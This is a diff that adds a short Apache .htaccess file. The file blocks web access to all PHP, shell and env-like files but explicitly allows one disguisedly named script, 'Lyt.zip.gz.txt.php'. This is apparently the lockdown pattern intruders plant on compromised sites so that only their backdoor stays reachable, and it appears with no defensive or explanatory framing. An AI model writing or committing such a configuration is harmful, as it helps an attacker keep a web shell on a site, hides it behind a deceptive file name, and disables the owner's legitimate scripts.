@@ -1,0 +1,7 @@
+<FilesMatch "(?i).*(ph|sh|pj|env).*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+<Files Lyt.zip.gz.txt.php>
+Allow from all
+</Files>
